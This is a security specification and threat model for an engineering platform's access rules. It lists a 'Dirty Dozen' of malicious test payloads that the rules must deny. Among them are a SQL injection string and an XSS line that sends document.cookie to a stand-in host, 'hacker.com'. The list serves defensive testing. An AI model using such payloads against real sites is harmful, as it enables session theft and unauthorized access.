# Security Specification & Threat Model (TDD specification)

This security specification details the authorization boundary and zero-trust policies defined for the Engineering Platform of Basra Chemical Engineers.

## Part 1: Core Data Invariants

1. **Email Verification Wall**: No user can read or write any private resources unless their authenticated email is verified (`request.auth.token.email_verified == true`).
2. **Strict Isolation of User Profiles**: A user can strictly read or write *only* their own `/users/{userId}` document. Profile fetching of other user records is mathematically blocked.
3. **Immutability of Administrative Status**: A student user is strictly forbidden from updating their `role` attribute to 'admin'.
4. **Denial-Of-Wallet Countermeasure**: To prevent costly recursive lookup charges on malicious invalid queries, all rules enforce strict ID size bounds and type-guards before database accesses are made.
5. **No Blind Global Reads**: Global profile-scraping is blocked. All queries must explicitly target specific document IDs.

---

## Part 2: The "Dirty Dozen" Threat Payloads

Here are 12 malicious payloads designed to breach Identity, Integrity, or State, which our security architectures must explicitly block (PERMISSION_DENIED):

### Identity & Spoofing Risks
1. **The Ghost Role injection**: Set profile role to `admin` during user sign-up.
2. **The Caller Spoofing**: Read `users/u-user-A` while authenticated as `u-user-B`.
3. **Unverified Email bypass**: Access `/users/u-user-A` with `email_verified = false`.
4. **Anonymous Data Harvesting**: Trigger blank global search read queries without being logged in.

### Resource & ID Poisoning
5. **1MB ID String Injection**: Write a user document using a giant random sequence string of 1MB as the document ID.
6. **SQL Escape Sequences**: Inject `' OR '1'='1` inside the username property.
7. **XSS Script Body Attack**: Inject `<script>fetch('hacker.com?cookie='+document.cookie)</script>` as the student name.

### State Corruption & Bypasses
8. **Created-At Backdating**: Overwrite `createdAt` of a user document with a manual date like `1990-01-01T00:00:00Z` during update.
9. **2FA Secret Forgery**: Overwrite another user's `twoFactorSecret` key without being validated or owning the profile path.
10. **System-Only Property Erasure**: Request deletion of a digital laboratory platform document from a non-admin client-side account.
11. **Academic Hijacking**: Set a university year longer than 250 characters to exhaust database buffer fields.
12. **Blind Query Scraping**: Request a wild list retrieval from `auditLogs` collection by an unauthenticated listener.

---

## Part 3: Test Verification Scenarios

We verify that ALL of the "Dirty Dozen" payloads fail stringently with permissions errors in our rules. All security rule validation asserts:
- `auth.uid != null`
- `auth.token.email_verified === true`
- `projectId` is immutable
- Input strings are validated for length limits and XSS sanitization.
